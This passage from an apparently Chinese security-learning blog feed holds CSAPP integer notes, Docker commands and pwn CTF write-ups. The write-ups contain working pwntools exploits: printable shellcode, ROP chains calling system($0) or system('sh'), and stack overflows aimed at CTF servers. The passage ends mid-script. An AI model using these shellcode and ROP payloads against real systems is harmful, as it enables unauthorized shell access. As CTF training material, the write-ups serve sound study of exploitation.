alt="image-20230902211549246"></p><p>对于在范围O≤x≤TMaxw之内的值x而言，我们得到T2Uv(x)&#x3D;x和U2Tw(x)&#x3D;x。也就是说，在这个范围内的数字有相同的无符号和补码表示。对于这个范围以外的数值，转换需要加上或者减去2^w。</p><h3 id="关于C语言中的整数问题"><a href="#关于C语言中的整数问题" class="headerlink" title="关于C语言中的整数问题"></a>关于C语言中的整数问题</h3><p>大多数数字都默认为是有符号的。例如，当声明一个像12345或者0x1A2B这样的常量时，这个值就被认为是有符号的。要创建一个无符号常量，必须加上后缀字符‘u’或者‘u’,例如，12345U或者0x1A2Bu。</p><p>在一台采用补码的机器上，当从无符号数转换为有符号数时，效果就是应用函数U2Tw,而从有符号数转换为无符号数时，就是应用函数T2U,其中w表示数据类型的位数</p><p>&#x3D;&#x3D;当执行一个运算时，如果它的一个运算数是有符号的而另一个是无符号的，那么C语言会隐式地将有符号参数强制类型转换为无符号数，并假设这两个数都是非负的，来执行这个运算。&#x3D;&#x3D;就像我们将要看到的，这种方法对于标准的算术运算来说并无多大差异，但是对于像&lt;和&gt;这样的关系运算符来说，它会导致非直观的结果。</p><p><img src="/../../images/CSAPP-2-%E4%BF%A1%E6%81%AF%E7%9A%84%E8%A1%A8%E7%A4%BA%E4%B8%8E%E5%A4%84%E7%90%86/image-20230902213240337.png" alt="image-20230902213240337"></p><p><strong>首先判断数有无符号，避免隐式转换</strong></p><p>如果用无符号的0与-1比较，会得到相反的结果</p><p><img src="/../../images/CSAPP-2-%E4%BF%A1%E6%81%AF%E7%9A%84%E8%A1%A8%E7%A4%BA%E4%B8%8E%E5%A4%84%E7%90%86/image-20230903161417562.png" alt="image-20230903161417562"></p><h3 id="扩展位数"><a href="#扩展位数" class="headerlink" title="扩展位数"></a>扩展位数</h3><p><img src="/../../images/CSAPP-2-%E4%BF%A1%E6%81%AF%E7%9A%84%E8%A1%A8%E7%A4%BA%E4%B8%8E%E5%A4%84%E7%90%86/image-20230902213410555.png" alt="image-20230902213410555"></p><p>1110&#x3D;&#x3D;&#x3D;-8&#x3D;&#x3D;+4+2&#x3D;-2</p><p>11110&#x3D;&#x3D;&#x3D;-16+8&#x3D;&#x3D;+…&#x3D;-2</p><p>……</p><h3 id="数字截断"><a href="#数字截断" class="headerlink" title="数字截断"></a>数字截断</h3><p><img src="/../../images/CSAPP-2-%E4%BF%A1%E6%81%AF%E7%9A%84%E8%A1%A8%E7%A4%BA%E4%B8%8E%E5%A4%84%E7%90%86/image-20230902215010672.png" alt="image-20230902215010672"></p><p><img src="/../../images/CSAPP-2-%E4%BF%A1%E6%81%AF%E7%9A%84%E8%A1%A8%E7%A4%BA%E4%B8%8E%E5%A4%84%E7%90%86/image-20230902215036686.png" alt="image-20230902215036686"></p><p>截断补码要关注第一位的0 1区别</p><p><img src="/../../images/CSAPP-2-%E4%BF%A1%E6%81%AF%E7%9A%84%E8%A1%A8%E7%A4%BA%E4%B8%8E%E5%A4%84%E7%90%86/image-20230902215107909.png" alt="image-20230902215107909"></p><h3 id="建议"><a href="#建议" class="headerlink" title="建议"></a>建议</h3><p><img src="/../../images/CSAPP-2-%E4%BF%A1%E6%81%AF%E7%9A%84%E8%A1%A8%E7%A4%BA%E4%B8%8E%E5%A4%84%E7%90%86/image-20230902215212072.png" alt="image-20230902215212072"></p><p>避免这类错误的一种方法就是绝不使用无符号数。实际上，除了C以外很少有语言支持无符号整数。</p><p>Java只支持有符号整数，并且要求以补码运算来实现。正常的右移运算符&gt;&gt;被定义为执行算术右移。特殊的运算符&gt;&gt;&gt;被指定为执行逻辑右移。</p><p>当我们想要把字仅仅看做是位的集合而没有任何数字意义时，无符号数值是非常有用的。例如，往一个字中放入描述各种布尔条件的标记(flag)时，就是这样。地址自然地就是无符号的，所以系统程序员发现无符号类型是很有帮助的。当实现模运算和多精度运算的数学包时，数字是由字的数组来表示的，无符号值也会非常有用。</p><h2 id="整数运算"><a href="#整数运算" class="headerlink" title="整数运算"></a>整数运算</h2><p>计算机的有限性会导致当数字大到所能表示的最大值后，就会溢出</p><h3 id="无符号加法"><a href="#无符号加法" class="headerlink" title="无符号加法"></a>无符号加法</h3><p><img src="/../../images/CSAPP-2-%E4%BF%A1%E6%81%AF%E7%9A%84%E8%A1%A8%E7%A4%BA%E4%B8%8E%E5%A4%84%E7%90%86/image-20230904171432434.png" alt="image-20230904171432434"></p><p>简单来说就是当产生溢出时会丢弃最高位（截断），程序没有任何异常</p><p>和取模类似</p><h3 id="补码加法"><a href="#补码加法" class="headerlink" title="补码加法"></a>补码加法</h3><p>不发生溢出的情况下，正常进行运算就可以获得正确的结果；发生溢出，负数相加可能获得正数或其他任何数</p><p>正数相加会得到负数</p><p><img src="/../../images/CSAPP-2-%E4%BF%A1%E6%81%AF%E7%9A%84%E8%A1%A8%E7%A4%BA%E4%B8%8E%E5%A4%84%E7%90%86/image-20230904172840961.png" alt="image-20230904172840961"></p><p><strong>运算溢出（空间耗尽）</strong></p><p>50000*50000&#x3D;？ </p><h2 id="浮点数-float"><a href="#浮点数-float" class="headerlink" title="浮点数(float)"></a>浮点数(float)</h2><h3 id="近似表示（舍入问题）"><a href="#近似表示（舍入问题）" class="headerlink" title="近似表示（舍入问题）"></a>近似表示（舍入问题）</h3><p>1e20-(1e20+3.14)&#x3D;0</p><p><img src="/../../images/CSAPP-2-%E4%BF%A1%E6%81%AF%E7%9A%84%E8%A1%A8%E7%A4%BA%E4%B8%8E%E5%A4%84%E7%90%86/image-20230813185230962.png" alt="image-20230813185230962"></p><p><img src="/../../images/CSAPP-2-%E4%BF%A1%E6%81%AF%E7%9A%84%E8%A1%A8%E7%A4%BA%E4%B8%8E%E5%A4%84%E7%90%86/image-20230813190046952.png" alt="image-20230813190046952"></p><p> 易写出非法的代码</p><p><img src="/../../images/CSAPP-2-%E4%BF%A1%E6%81%AF%E7%9A%84%E8%A1%A8%E7%A4%BA%E4%B8%8E%E5%A4%84%E7%90%86/image-20230813153016202.png" alt="image-20230813153016202"></p><p>不同的内存访问模式对计算机性能优化有巨大效果（与内存层次结构的缓存有关）</p><h1 id="课后习题要点"><a href="#课后习题要点" class="headerlink" title="课后习题要点"></a>课后习题要点</h1><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
      <category>pwn前置知识</category>
      
      <category>CSAPP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CSAPP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ctf_xined实战与避坑</title>
    <link href="/2023/08/26/Docker/ctf-xined%E5%AE%9E%E6%88%98%E4%B8%8E%E9%81%BF%E5%9D%91/"/>
    <url>/2023/08/26/Docker/ctf-xined%E5%AE%9E%E6%88%98%E4%B8%8E%E9%81%BF%E5%9D%91/</url>
    
    <content type="html"><![CDATA[<h1 id="ctf-xined-实操"><a href="#ctf-xined-实操" class="headerlink" title="ctf_xined 实操"></a>ctf_xined 实操</h1><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><blockquote><p>docker build -t “elf_name:18.04” .</p><p>#推荐加上环境版本</p><p>docker run -d -p 0.0.0.0:7777:9999 elf_name:18.04</p><p>#此命令开启端口为“0.0.0.0:7777”</p></blockquote><h2 id="容器关闭、删除"><a href="#容器关闭、删除" class="headerlink" title="容器关闭、删除"></a>容器关闭、删除</h2><blockquote><p>docker ps -a#显示所有容器</p><p>docker stop XXX#停止正在运行的容器</p><p>docker rm XXX#删除镜像</p></blockquote><h1 id="学习"><a href="#学习" class="headerlink" title="学习"></a>学习</h1><h2 id="docker安装及部署"><a href="#docker安装及部署" class="headerlink" title="docker安装及部署"></a>docker安装及部署</h2>]]></content>
    
    
    <categories>
      
      <category>软件</category>
      
      <category>Docker</category>
      
    </categories>
    
    
    <tags>
      
      <tag>软件介绍</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>4.水平</title>
    <link href="/2023/08/26/src%E5%85%A5%E9%97%A8/4-%E6%B0%B4%E5%B9%B3&amp;%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83/"/>
    <url>/2023/08/26/src%E5%85%A5%E9%97%A8/4-%E6%B0%B4%E5%B9%B3&amp;%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>src入门</category>
      
    </categories>
    
    
    <tags>
      
      <tag>src</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>3.条件竞争</title>
    <link href="/2023/08/26/src%E5%85%A5%E9%97%A8/3-%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/"/>
    <url>/2023/08/26/src%E5%85%A5%E9%97%A8/3-%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>src入门</category>
      
    </categories>
    
    
    <tags>
      
      <tag>src</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2.弱口令</title>
    <link href="/2023/08/26/src%E5%85%A5%E9%97%A8/2-%E5%BC%B1%E5%8F%A3%E4%BB%A4/"/>
    <url>/2023/08/26/src%E5%85%A5%E9%97%A8/2-%E5%BC%B1%E5%8F%A3%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<h1 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h1><p>容易猜到，可爆破的口令</p><h2 id><a href="#" class="headerlink" title></a></h2>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>src入门</category>
      
    </categories>
    
    
    <tags>
      
      <tag>src</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>1.信息收集</title>
    <link href="/2023/08/26/src%E5%85%A5%E9%97%A8/1-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <url>/2023/08/26/src%E5%85%A5%E9%97%A8/1-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>src入门</category>
      
    </categories>
    
    
    <tags>
      
      <tag>src</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>8.19_WP</title>
    <link href="/2023/08/19/WP/%E5%86%85%E9%83%A8%E8%B5%9B/8.19_WP/"/>
    <url>/2023/08/19/WP/%E5%86%85%E9%83%A8%E8%B5%9B/8.19_WP/</url>
    
    <content type="html"><![CDATA[<h1 id="login"><a href="#login" class="headerlink" title="login"></a>login</h1><p>[CISCN 2022]login-normal</p><h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>首先看看保护</p><p><img src="/../../../images/8.19_WP/image-20230819142230080.png" alt="image-20230819142230080"></p><p>保护全开。。。</p><p>进入IDA中</p><p>题目的关键在于能否看懂sub_FFD函数做了什么</p><p>下面的这一段功能是告诉我们命令的匹配方法</p><p><img src="/../../../images/8.19_WP/image-20230819183644871.png" alt="image-20230819183644871"></p><p><img src="/../../../images/8.19_WP/image-20230819183754813.png" alt="image-20230819183754813"></p><p>opt:v7\n+msg:dest\n<br>只有匹配到这种格式的才是合法的命令，不然就会报错退出。<br>需要注意的是，由于从nptr复制到dest的时候传输的字节数是nptr的长度减1，因此需要多传一个无用的字节才能使得正确的msg成为dest。</p><p>漏洞点：</p><p><img src="/../../../images/8.19_WP/image-20230819184856943.png" alt="image-20230819184856943"></p><p>当v7为2时就会调用这个函数，它会检测两个全局变量的值是否为1，如果都为1就会将dest的内容作为shellcode执行。因此我们需要传入一个可视字符的shellcode。<br>而要改变这两个全局变量，就要先执行v7为1时对应的一个函数，要求dest指向的内容为ro0t即可改变这两个变量。</p><p><img src="/../../../images/8.19_WP/image-20230819185004441.png" alt="image-20230819185004441"></p><p>难度主要在代码审计上</p><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br> <br><span class="hljs-comment">#io=process(&quot;./login&quot;)</span><br>io=remote(<span class="hljs-string">&#x27;182.92.176.248&#x27;</span>,<span class="hljs-number">1111</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./login&#x27;</span>)<br> <br>shellcode=<span class="hljs-string">&#x27;Rh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&#x27;</span><br>payload1=<span class="hljs-string">&#x27;opt:1\nmsg:ro0ta\n&#x27;</span>   <span class="hljs-comment">#a来占位，1对应case1的情况</span><br>payload2=<span class="hljs-string">&#x27;opt:2\n&#x27;</span>+<span class="hljs-string">&#x27;msg:&#x27;</span>+shellcode+<span class="hljs-string">&#x27;\r\n&#x27;</span>   <span class="hljs-comment">#\r占位，2对应case2</span><br> <br>io.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&gt; &#x27;</span>,payload1)<br>io.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&gt; &#x27;</span>,payload2)<br> <br>io.interactive()<br></code></pre></td></tr></table></figure><h1 id="where-is-shell"><a href="#where-is-shell" class="headerlink" title="where_is_shell"></a>where_is_shell</h1><h2 id="过程-1"><a href="#过程-1" class="headerlink" title="过程"></a>过程</h2><p>首先看看保护</p><p><img src="/../../../images/8.19_WP/image-20230819142045580.png" alt="image-20230819142045580"></p><p>进入IDA中</p><p>文件本身很简单</p><p>代码段是有r权限的，但是却并没有找到&#x2F;bin&#x2F;sh字符串，同时题目给出了一个tips，那么就需要到tips里面找字符串</p><p>**system的参数不一定必须是“&#x2F;bin&#x2F;sh”,system($0) **</p><p><strong>‘$0’ 代表当前运行的命令名，一般用于脚本中。</strong></p><p><strong>$0在机器码中为 \x24\x30</strong></p><p><img src="/../../../images/8.19_WP/image-20230819183044670.png" alt="image-20230819183044670"></p><p>在<code>0x400541</code>处找到了<code>\x24\x30</code>即<code>$0</code>,直接<code>system($0)</code>就能拿到shell（可以用D快捷键来查看）</p><h2 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#io = process(&#x27;./shell&#x27;)</span><br>io = remote(<span class="hljs-string">&#x27;182.92.176.248&#x27;</span>,<span class="hljs-number">2222</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./shell&#x27;</span>)<br><br>ret_addr = <span class="hljs-number">0x400416</span> <br>pop_rdi_ret = <span class="hljs-number">0x4005e3</span> <br>tips = <span class="hljs-number">0x400541</span><br>system_addr = elf.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>+p64(ret_addr)+p64(pop_rdi_ret)+p64(tips)+p64(system_addr)<br><br>io.sendlineafter(<span class="hljs-string">&#x27;find it?\n&#x27;</span>,payload)<br>io.interactive()<br></code></pre></td></tr></table></figure><h1 id="qiandaoa"><a href="#qiandaoa" class="headerlink" title="qiandaoa"></a>qiandaoa</h1><h2 id="过程-2"><a href="#过程-2" class="headerlink" title="过程"></a>过程</h2><p>首先看看保护</p><p><img src="/../../../images/8.19_WP/image-20230819142202559.png" alt="image-20230819142202559"></p><p>进入IDA中</p><p><img src="/../../../images/8.19_WP/image-20230819180347777.png" alt="image-20230819180347777"></p><p>乍一看很复杂</p><p>发现s1是48字节,但是scanf读入100,存在溢出点</p><p>进入getflag函数</p><p><img src="/../../../images/8.19_WP/image-20230819180502552.png" alt="image-20230819180502552"></p><p>他说flag就是log</p><p><img src="/../../../images/8.19_WP/image-20230819180615988.png" alt="image-20230819180615988"></p><p>那么case 1,添加一个log,然后case 4去get flag</p><p>程序有system函数，但是没有&#x2F;bin&#x2F;sh字符串</p><p><strong>system的参数不一定必须是“&#x2F;bin&#x2F;sh”，单独的“sh”有时也可以拿到shell</strong>（涨知识了）</p><p>接下来就是用ROPgadget构造ROP链</p><h2 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br> <br>io=remote(<span class="hljs-string">&quot;182.92.176.248&quot;</span>,<span class="hljs-number">8888</span>)<br><span class="hljs-comment">#io=process(&#x27;./qiandaoa&#x27;)</span><br>elf=ELF(<span class="hljs-string">&#x27;./qiandaoa&#x27;</span>)<br><br>system_addr=elf.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>shell_addr=<span class="hljs-number">0x80482ea</span><br> <br>io.recvuntil(<span class="hljs-string">&#x27;Please input admin password:&#x27;</span>)<br>io.sendline(<span class="hljs-string">&#x27;administrator&#x27;</span>)<br> <br>io.recvuntil(<span class="hljs-string">&#x27;0.Exit\n:&#x27;</span>)<br>io.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br> <br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x48</span>+<span class="hljs-number">4</span>)+p32(system_addr)+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">4</span>+p32(shell_addr)<br> <br>io.recvuntil(<span class="hljs-string">&#x27;Please input new log info:&#x27;</span>)<br>io.sendline(payload)<br> <br>io.recvuntil(<span class="hljs-string">&#x27;0.Exit\n:&#x27;</span>)<br>io.sendline(<span class="hljs-string">&#x27;4&#x27;</span>)<br> <br>io.interactive()<br></code></pre></td></tr></table></figure><h1 id="eaz-text"><a href="#eaz-text" class="headerlink" title="eaz_text"></a>eaz_text</h1><h2 id="过程-3"><a href="#过程-3" class="headerlink" title="过程"></a>过程</h2><p>首先看看保护</p><p><img src="/../../../images/8.19_WP/image-20230819163712747.png" alt="image-20230819163712747"></p><p>进入IDA中</p><p><img src="/../../../images/8.19_WP/image-20230819164534755.png" alt="image-20230819164534755"></p><p>发现后门函数</p><p><img src="/../../../images/8.19_WP/image-20230819164617778.png" alt="image-20230819164617778"></p><p><img src="/../../../images/8.19_WP/image-20230819165019303.png" alt="image-20230819165019303"></p><p>可以直接打过去</p><h2 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#io=process(&#x27;./ez_text&#x27;)</span><br>io=remote(<span class="hljs-string">&#x27;101.37.118.53&#x27;</span>,<span class="hljs-number">8686</span>)<br><br>binsh_addr=<span class="hljs-number">0x08048763</span><br>system_addr=<span class="hljs-number">0x0804831A</span><br>target=<span class="hljs-number">0x804863a</span><br><br>payload=<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x6c</span> + <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">4</span> + p32(target) <br><br>io.sendafter(<span class="hljs-string">&#x27;anything?&#x27;</span>,payload)<br>io.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
      <category>pwn练习记录</category>
      
      <category>每周一练</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Docker使用</title>
    <link href="/2023/08/03/Docker/Docker%E4%BD%BF%E7%94%A8/"/>
    <url>/2023/08/03/Docker/Docker%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="Docker常用指令及原理"><a href="#Docker常用指令及原理" class="headerlink" title="Docker常用指令及原理"></a>Docker常用指令及原理</h1><h2 id="run指令原理"><a href="#run指令原理" class="headerlink" title="run指令原理"></a>run指令原理</h2><p><img src="/../images/Docker%E4%BD%BF%E7%94%A8/image-20230803223957561.png" alt="image-20230803223957561"></p><h2 id="底层原理"><a href="#底层原理" class="headerlink" title="底层原理"></a>底层原理</h2><p>Docker是一个Client-Sever结构的系统，Docker的守护进程运行在主机上，通过Socket从客户端访问。</p><p>DockerSever接收到DockerClient的指令，就会执行这个命令。</p><p><img src="/../images/Docker%E4%BD%BF%E7%94%A8/image-20230803230548099.png" alt="image-20230803230548099"></p><p><img src="/../images/Docker%E4%BD%BF%E7%94%A8/image-20230803231957633.png" alt="image-20230803231957633"></p>]]></content>
    
    
    <categories>
      
      <category>软件</category>
      
      <category>Docker</category>
      
    </categories>
    
    
    <tags>
      
      <tag>软件使用</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>1~10</title>
    <link href="/2023/08/01/WP/BUUCTF/1-10/"/>
    <url>/2023/08/01/WP/BUUCTF/1-10/</url>
    
    <content type="html"><![CDATA[<h1 id="BUUCTF（1-10题wp）"><a href="#BUUCTF（1-10题wp）" class="headerlink" title="BUUCTF（1~10题wp）"></a>BUUCTF（1~10题wp）</h1><h2 id="1-test-your-nc"><a href="#1-test-your-nc" class="headerlink" title="1.test_your_nc"></a>1.test_your_nc</h2><p>运行，直接利用system函数“cat flag”即可。</p><h2 id="2-rip"><a href="#2-rip" class="headerlink" title="2.rip"></a>2.rip</h2><h3 id="1-解题思路"><a href="#1-解题思路" class="headerlink" title="(1)解题思路"></a>(1)解题思路</h3><p>例行检查后，用 <kbd>F5</kbd> 查看伪代码</p><p><img src="/../images/1-10/image-20230405162937267.png" alt="2.1"></p><p>发现gets危险输入</p><p><img src="/../images/1-10/image-20230405163225751.png" alt="2.2"></p><p>看到fun函数调用了“system”，找到fun的地址 0x401186</p><p>则利用gets溢出返回到fun函数地址即可</p><h3 id="2-Payload"><a href="#2-Payload" class="headerlink" title="(2)Payload"></a>(2)Payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python3">#!/usr/bin/env python<br>from pwn import *<br><br>sh = remote(&quot;node4.buuoj.cn&quot;,28996)<br><br>system_addr = 0x401186<br>sh.sendline(b&#x27;A&#x27;*15+b&#x27;a&#x27;*8 + p64(system_addr))<br>sh.interactive()<br></code></pre></td></tr></table></figure><p><strong>PS</strong>：有时栈的大小未知，需要利用GDB调试出偏移地址的大小。</p><h2 id="3-warmup-csaw-2016"><a href="#3-warmup-csaw-2016" class="headerlink" title="3.warmup_csaw_2016"></a>3.warmup_csaw_2016</h2><h3 id="1-解题思路-1"><a href="#1-解题思路-1" class="headerlink" title="(1)解题思路"></a>(1)解题思路</h3><p>例行检查，用 <kbd>F5</kbd> 查看伪代码</p><p><img src="/../images/1-10/image-20230405164743647.png" alt="3.1"></p><p>发现flag提示</p><p><img src="/../images/1-10/image-20230405164659197.png" alt="3.2"></p><p>找到调用system的函数地址：0x400611</p><p><img src="/../images/1-10/image-20230405165018347.png" alt="3.3"></p><p><img src="/../images/1-10/image-20230405170440308.png" alt="3.4"></p><h3 id="2-GDB调试找偏移地址"><a href="#2-GDB调试找偏移地址" class="headerlink" title="(2)GDB调试找偏移地址"></a>(2)<em>GDB调试找偏移地址</em></h3><p>1.打断点</p><p><img src="/../images/1-10/image-20230405175926725.png" alt="point1"></p><p>2.先 r 一下</p><p><strong>3.利用cyclic函数生成构造的字符串队列，作为程序的输入。</strong></p><img src="../images/1-10/image-20230405181049487.png" alt="point2"><p><strong>4.利用”cyclic -l 中断字符串“计算得出偏移：</strong></p><p><img src="/../images/1-10/image-20230405181318593.png" alt="point3"></p><p><strong>PS</strong>：由于char构造的字符数组在实际分配内存时会多占用一个字节的内存。多出来的一个字节用来存储”\0”用来表示字符串的结束。</p><p>故所得偏移地址为64字节，即0x40为栈的大小。</p><h3 id="3-Payload"><a href="#3-Payload" class="headerlink" title="(3)Payload"></a>(3)Payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python3">from pwn import *<br>sh = remote(&#x27;node4.buuoj.cn&#x27;,29352)<br>payload=B&#x27;a&#x27;*(0x40+8)+p64(0x400611)<br>sh.sendline(payload)<br>sh.interactive()<br></code></pre></td></tr></table></figure><h2 id="4-ciscn-2019-n-1"><a href="#4-ciscn-2019-n-1" class="headerlink" title="4.ciscn_2019_n_1"></a>4.ciscn_2019_n_1</h2><h3 id="1-解题思路-2"><a href="#1-解题思路-2" class="headerlink" title="(1)解题思路"></a>(1)解题思路</h3><p>例行检查，用 <kbd>F5</kbd> 查看伪代码</p><p><img src="/../images/1-10/image-20230406192357497.png" alt="4.1"></p><p>进入fun( )函数中</p><p><img src="/../images/1-10/image-20230406192445828.png" alt="4.2"></p><p><strong>发现需要利用gets函数溢出到v2的地址，并修改v2的值为11.28125，从而返回system函数拿到flag。</strong></p><p>找到v2和v1的地址</p><p> <img src="/../images/1-10/image-20230406193412024.png" alt="4.3"></p><p>偏移地址&#x3D;0x30-0x04&#x3D;0x2c</p><p>11.28125&#x3D;0x41348000</p><h3 id="2-Payload-1"><a href="#2-Payload-1" class="headerlink" title="(2)Payload"></a>(2)Payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python3">from pwn import *<br><br>r=remote(&#x27;node4.buuoj.cn&#x27;,26573)<br>payload=B&#x27;a&#x27;*0x2c+p64(0x41348000)<br>r.sendline(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h2 id="5-pwn1-sctf-2016"><a href="#5-pwn1-sctf-2016" class="headerlink" title="5.pwn1_sctf_2016"></a>5.pwn1_sctf_2016</h2><h3 id="1-解题思路-3"><a href="#1-解题思路-3" class="headerlink" title="(1)解题思路"></a>(1)解题思路</h3><p>例行检查后，用 <kbd>F5</kbd> 查看伪代码</p><p><img src="/../images/1-10/image-20230405113611488.png" alt="5.1"></p><p>发现只有一个“vuln()”函数，点进去</p><p><img src="/../images/1-10/image-20230405113743751.png" alt="5.2"></p><p>在网上搜索大佬的解释，发现fgets是我们的输入点，但是它只读入了32（&#x3D;0x20）长度的数据，小于0x3c，没有办法造成溢出，但是这个程序有点意思的地方就在于<strong>会将一个字节的“I”替换成三个字节的“you”</strong><br>那么思路来了，我们输入20字节的 “I” ，经过第19行的replace函数后会变成60字节的 “you” ，这样就可以进行溢出了，之后覆盖ebp，覆盖返回地址为输出flag的函数地址，就可以完成利用！</p><p><img src="/../images/1-10/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21jbXV5YW5nYQ==,size_16,color_FFFFFF,t_70.png" alt="5.2"></p><p>然后用 <kbd>Shift</kbd>+<kbd>F12</kbd> 来查看程序里的字符串</p><p><img src="/../images/1-10/image-20230405114511713.png" alt="5.3"></p><p>发现有明显的flag提示</p><p>找到调用“system”函数的地址</p><p><img src="/../images/1-10/image-20230405142650865.png" alt="5.4"></p><p><img src="/../images/1-10/image-20230405145102227.png" alt="5.5"></p><h3 id="2-Payload-2"><a href="#2-Payload-2" class="headerlink" title="(2)Payload"></a>(2)Payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python3">from pwn import * 